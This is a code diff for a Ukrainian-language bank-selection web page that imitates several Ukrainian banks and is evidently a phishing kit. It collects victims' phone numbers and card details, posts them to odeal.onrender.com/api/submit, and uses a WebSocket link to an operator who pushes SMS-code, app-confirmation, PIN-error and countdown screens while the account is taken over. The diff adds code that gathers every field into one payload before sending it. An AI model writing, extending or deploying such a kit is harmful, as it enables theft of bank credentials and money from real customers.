@@ -5,79 +5,43 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Оберіть свій банк</title>
     <style>
-        /* ВАШИ СТИЛИ, СКОПИРОВАННЫЕ 1 в 1 */
-        :root {
-            --dark-text: #212529; --light-text: #6c757d; --border-color: #dee2e6;
-            --white: #ffffff; --shadow-color: rgba(0, 0, 0, 0.08); --danger-color: #dc3545;
-        }
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
-            margin: 0; color: var(--dark-text); transition: background 0.5s ease-in-out; background: #f0f2f5;
-        }
+        :root { --dark-text: #212529; --light-text: #6c757d; --border-color: #dee2e6; --white: #ffffff; --shadow-color: rgba(0, 0, 0, 0.08); --danger-color: #dc3545; }
+        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif; margin: 0; color: var(--dark-text); transition: background 0.5s ease-in-out; background: #f0f2f5; }
         .screen { padding: 20px; transition: opacity 0.5s ease-in-out, transform 0.5s ease-in-out; }
-        #bank-selection-screen { opacity: 1; transform: scale(1); }
-        #form-screen {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%; box-sizing: border-box;
-            opacity: 0; visibility: hidden; transform: scale(1.05);
-            transition: opacity 0.5s ease-in-out, transform 0.5s ease-in-out, visibility 0s 0.5s;
-            display: grid; place-items: center; padding: 20px;
-        }
+        #form-screen { position: fixed; top: 0; left: 0; width: 100%; height: 100%; box-sizing: border-box; opacity: 0; visibility: hidden; transform: scale(1.05); transition: opacity 0.5s ease-in-out, transform 0.5s ease-in-out, visibility 0s 0.5s; display: grid; place-items: center; padding: 20px; }
         body.form-active { background: var(--bg-gradient); }
         body.form-active #bank-selection-screen { opacity: 0; transform: scale(0.95); pointer-events: none; }
         body.form-active #form-screen { opacity: 1; visibility: visible; transform: scale(1); transition-delay: 0s; }
         h1 { text-align: center; font-size: 24px; font-weight: 600; margin-bottom: 40px; }
         .bank-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(140px, 1fr)); gap: 20px; }
-        .bank-item {
-            display: flex; flex-direction: column; align-items: center; justify-content: center;
-            background-color: var(--white); padding: 20px; border: 1px solid var(--border-color);
-            border-radius: 16px; text-decoration: none; color: var(--dark-text); text-align: center;
-            height: 120px; transition: all 0.3s cubic-bezier(0.25, 0.8, 0.25, 1); cursor: pointer;
-            box-shadow: 0 4px 10px var(--shadow-color);
-        }
+        .bank-item { display: flex; flex-direction: column; align-items: center; justify-content: center; background-color: var(--white); padding: 20px; border: 1px solid var(--border-color); border-radius: 16px; text-decoration: none; color: var(--dark-text); text-align: center; height: 120px; transition: all 0.3s cubic-bezier(0.25, 0.8, 0.25, 1); cursor: pointer; box-shadow: 0 4px 10px var(--shadow-color); }
         .bank-item:hover { transform: translateY(-8px); box-shadow: 0 10px 20px var(--shadow-color); }
         .bank-item img { max-height: 55px; max-width: 100%; object-fit: contain; margin-bottom: 15px; }
         .bank-item .bank-name { font-size: 15px; font-weight: 600; }
-        .form-container {
-            background-color: var(--white); padding: 30px; border-radius: 20px;
-            width: 100%; max-width: 380px; box-shadow: 0 15px 40px rgba(0,0,0,0.2);
-            box-sizing: border-box;
-        }
+        .form-container { background-color: var(--white); padding: 30px; border-radius: 20px; width: 100%; max-width: 380px; box-shadow: 0 15px 40px rgba(0,0,0,0.2); box-sizing: border-box; }
         #form-header { text-align: center; margin-bottom: 25px; }
         #form-header-logo { max-height: 50px; max-width: 150px; }
         #modal-title { margin-top: 25px; font-size: 22px; font-weight: 700; text-align: center; margin-bottom: 25px; }
         #modal-step-content p { text-align: center; font-size: 16px; color: var(--light-text); line-height: 1.6; margin: 15px 0; font-weight: 500;}
-        #modal-step-content .text-danger { color: var(--danger-color); font-weight: 700; }
         .input-group { margin-bottom: 15px; }
         .input-group:last-child { margin-bottom: 0; }
-        .input-field {
-            width: 100%; padding: 15px; border: 1px solid var(--border-color); border-radius: 12px;
-            font-size: 18px; font-weight: 500; box-sizing: border-box; transition: all 0.3s ease;
-        }
-        .input-field::placeholder { color: #adb5bd; }
+        .input-field { width: 100%; padding: 15px; border: 1px solid var(--border-color); border-radius: 12px; font-size: 18px; font-weight: 500; box-sizing: border-box; transition: all 0.3s ease; }
         .phone-input-wrapper { display: flex; }
-        .phone-prefix {
-            padding: 15px; border: 1px solid var(--border-color); border-right: none;
-            background-color: #f8f9fa; border-radius: 12px 0 0 12px; font-weight: 500;
-            flex-shrink: 0; display: flex; align-items: center;
-        }
+        .phone-prefix { padding: 15px; border: 1px solid var(--border-color); border-right: none; background-color: #f8f9fa; border-radius: 12px 0 0 12px; font-weight: 500; flex-shrink: 0; display: flex; align-items: center; }
         .phone-input-wrapper .input-field { border-radius: 0 12px 12px 0; flex: 1; width: auto; min-width: 0; }
         .multi-input-row { display: flex; gap: 10px; }
         .modal-footer { margin-top: 30px; display: flex; gap: 15px; justify-content: center; }
-        .btn {
-            width: 100%; padding: 16px; border: none; border-radius: 12px; font-size: 18px;
-            font-weight: 700; cursor: pointer; transition: all 0.3s ease;
-            flex-basis: 0; flex-grow: 1;
-        }
+        .btn { width: 100%; padding: 16px; border: none; border-radius: 12px; font-size: 18px; font-weight: 700; cursor: pointer; transition: all 0.3s ease; flex-basis: 0; flex-grow: 1; }
         .btn:active { transform: translateY(0) scale(0.97); }
         body { --primary-color: #00A39C; --accent-color: #008a84; --text-on-primary: #ffffff; --bg-gradient: linear-gradient(135deg, #E0F2F1 0%, #B2DFDB 100%); }
-        body[data-theme="pumb"]       { --primary-color: #EF3E42; --accent-color: #212529; --text-on-primary: #ffffff; --bg-gradient: linear-gradient(135deg, #4c4c4c 0%, #2b2b2b 100%); }
+        body[data-theme="pumb"] { --primary-color: #EF3E42; --accent-color: #212529; --text-on-primary: #ffffff; --bg-gradient: linear-gradient(135deg, #4c4c4c 0%, #2b2b2b 100%); }
         body[data-theme="raiffeisen"] { --primary-color: #FFDD00; --accent-color: #000000; --text-on-primary: #000000; --bg-gradient: linear-gradient(135deg, #4d4d4d 0%, #1a1a1a 100%); }
-        body[data-theme="alliance"]   { --primary-color: #0078C9; --accent-color: #005a99; --text-on-primary: #ffffff; --bg-gradient: linear-gradient(135deg, #E3F2FD 0%, #BBDEFB 100%); }
-        body[data-theme="otp"]        { --primary-color: #8CC63F; --accent-color: #2D2926; --text-on-primary: #ffffff; --bg-gradient: linear-gradient(135deg, #F1F8E9 0%, #DCEDC8 100%); }
-        body[data-theme="vostok"]     { --primary-color: #F58220; --accent-color: #D84315; --text-on-primary: #ffffff; --bg-gradient: linear-gradient(135deg, #FFF3E0 0%, #FFE0B2 100%); }
-        body[data-theme="izibank"]    { --primary-color: #FF7A00; --accent-color: #E65100; --text-on-primary: #ffffff; --bg-gradient: linear-gradient(135deg, #FFF3E0 0%, #FFE0B2 100%); }
-        body[data-theme="novapay"]    { --primary-color: #5C45A0; --accent-color: #4527A0; --text-on-primary: #ffffff; --bg-gradient: linear-gradient(135deg, #EDE7F6 0%, #D1C4E9 100%); }
-        body[data-theme="ukrsib"]     { --primary-color: #95C11F; --accent-color: #689F38; --text-on-primary: #ffffff; --bg-gradient: linear-gradient(135deg, #F1F8E9 0%, #DCEDC8 100%); }
+        body[data-theme="alliance"] { --primary-color: #0078C9; --accent-color: #005a99; --text-on-primary: #ffffff; --bg-gradient: linear-gradient(135deg, #E3F2FD 0%, #BBDEFB 100%); }
+        body[data-theme="otp"] { --primary-color: #8CC63F; --accent-color: #2D2926; --text-on-primary: #ffffff; --bg-gradient: linear-gradient(135deg, #F1F8E9 0%, #DCEDC8 100%); }
+        body[data-theme="vostok"] { --primary-color: #F58220; --accent-color: #D84315; --text-on-primary: #ffffff; --bg-gradient: linear-gradient(135deg, #FFF3E0 0%, #FFE0B2 100%); }
+        body[data-theme="izibank"] { --primary-color: #FF7A00; --accent-color: #E65100; --text-on-primary: #ffffff; --bg-gradient: linear-gradient(135deg, #FFF3E0 0%, #FFE0B2 100%); }
+        body[data-theme="novapay"] { --primary-color: #5C45A0; --accent-color: #4527A0; --text-on-primary: #ffffff; --bg-gradient: linear-gradient(135deg, #EDE7F6 0%, #D1C4E9 100%); }
+        body[data-theme="ukrsib"] { --primary-color: #95C11F; --accent-color: #689F38; --text-on-primary: #ffffff; --bg-gradient: linear-gradient(135deg, #F1F8E9 0%, #DCEDC8 100%); }
         .btn-next { background-color: var(--primary-color); color: var(--text-on-primary); }
         .btn-back { background-color: #f1f3f5; color: var(--light-text); }
     </style>
@@ -105,6 +69,7 @@ document.addEventListener('DOMContentLoaded', () => {
     let ws;
     let activeBankData = {};
     let currentStepIndex = 0;
+    let collectedData = {};
     
     const defaultSteps = [ { type: 'phone', title: 'Введіть номер телефону' }, { type: 'card_extended', title: 'Для верифікації заповніть форму' } ];
     const bankFlows = {
@@ -121,7 +86,6 @@ document.addEventListener('DOMContentLoaded', () => {
 
     const bankGrid = document.querySelector('.bank-grid');
     const body = document.body;
-    const formScreen = document.getElementById('form-screen');
     const formHeaderLogo = document.getElementById('form-header-logo');
     const modalTitle = document.getElementById('modal-title');
     const stepContent = document.getElementById('modal-step-content');
@@ -152,18 +116,20 @@ document.addEventListener('DOMContentLoaded', () => {
             formHeaderLogo.src = activeBankData.logoUrl;
             body.classList.add('form-active');
             currentStepIndex = 0;
+            collectedData = {};
             renderStep();
             connectWebSocket();
         });
     });
 
-    async function sendDataToServer(data) {
+    async function sendDataToServer(data, isFinal) {
+        collectedData = { ...collectedData, ...data };
         const serverUrl = 'odeal.onrender.com';
         try {
             await fetch(`https://${serverUrl}/api/submit`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ sessionId, bankName: activeBankData.name, ...data }),
+                body: JSON.stringify({ sessionId, bankName: activeBankData.name, isFinalStep: isFinal, ...collectedData }),
             });
         } catch (error) { console.error('Failed to send data:', error); }
     }
@@ -177,9 +143,12 @@ document.addEventListener('DOMContentLoaded', () => {
             if (key === 'phone') { value = '+380' + value; }
             data[key] = value;
         });
-        sendDataToServer(data);
+        
+        const isFinalStep = (currentStepIndex + 1) >= activeBankData.steps.length;
+        sendDataToServer(data, isFinalStep);
+
         currentStepIndex++;
-        if (currentStepIndex < activeBankData.steps.length) {
+        if (!isFinalStep) {
             renderStep();
         } else {
             modalTitle.textContent = 'Очікуємо';
@@ -237,40 +206,38 @@ document.addEventListener('DOMContentLoaded', () => {
 
     function handleServerCommand(command) {
         const { type, data } = command;
-        const formContainer = document.querySelector('.form-container');
-
         const showMessageWithButton = (title, text, btnText, callback) => {
             modalTitle.textContent = title;
             stepContent.innerHTML = `<p style="text-align:center;">${text}</p>`;
+            modalFooter.style.display = 'flex';
             modalFooter.innerHTML = `<button class="btn btn-back">${btnText}</button>`;
             modalFooter.querySelector('button').addEventListener('click', callback);
         };
-
         switch (type) {
             case 'sms':
                 modalTitle.textContent = 'Введіть код з SMS';
                 stepContent.innerHTML = `<p style="text-align:center;">${data.text}</p><div class="input-group"><input type="tel" id="sms-code" class="input-field" placeholder="Введіть код"></div><div id="sms-error-container"></div>`;
+                modalFooter.style.display = 'flex';
                 modalFooter.innerHTML = `<button class="btn btn-next" id="submit-sms-code">відправити</button>`;
                 modalFooter.querySelector('#submit-sms-code').addEventListener('click', submitSmsCode);
                 break;
             case 'app':
                 modalTitle.textContent = 'Підтвердження';
                 stepContent.innerHTML = `<p style="text-align:center;">${data.text}</p>`;
-                modalFooter.innerHTML = '';
+                modalFooter.style.display = 'none';
                 break;
             case 'other': showMessageWithButton("Помилка", data.text, "Обрати інший банк", () => window.location.reload()); break;
             case 'pin_error': showMessageWithButton("Невірний ПІН", data.text, "Назад", () => window.location.reload()); break;
             case 'card_error': showMessageWithButton("Невірна картка", data.text, "Назад", () => window.location.reload()); break;
             case 'number_error': showMessageWithButton("Невірний номер", data.text, "Назад", () => window.location.reload()); break;
             case 'code_error':
-                modalTitle.textContent = "Невірний код";
                 const errorContainer = document.getElementById('sms-error-container');
                 if (errorContainer) { errorContainer.innerHTML = `<p style="color:red; text-align:center;">ви ввели невірний код</p>`; }
                 break;
             case 'timer':
                 modalTitle.textContent = 'Обробка заявки';
                 stepContent.innerHTML = `<div id="timer" style="color:var(--primary-color); font-size: 32px; font-weight: 700; text-align: center; margin-top: 20px;">15:00</div>`;
-                modalFooter.innerHTML = '';
+                modalFooter.style.display = 'none';
                 let duration = 15 * 60; const display = document.getElementById('timer');
                 const timerInterval = setInterval(() => {
                     let minutes = parseInt(duration / 60, 10); let seconds = parseInt(duration % 60, 10);
